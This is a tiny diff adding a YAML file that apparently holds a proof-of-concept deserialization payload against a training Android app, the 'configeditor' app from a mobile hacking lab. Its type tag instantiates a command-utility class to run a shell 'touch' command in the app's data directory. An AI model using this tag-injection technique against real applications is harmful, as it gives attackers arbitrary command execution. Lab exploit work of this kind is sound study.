@@ -1,0 +1,2 @@
+exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/com.mobilehackinglab.configeditor/nutm3.txt"]
+
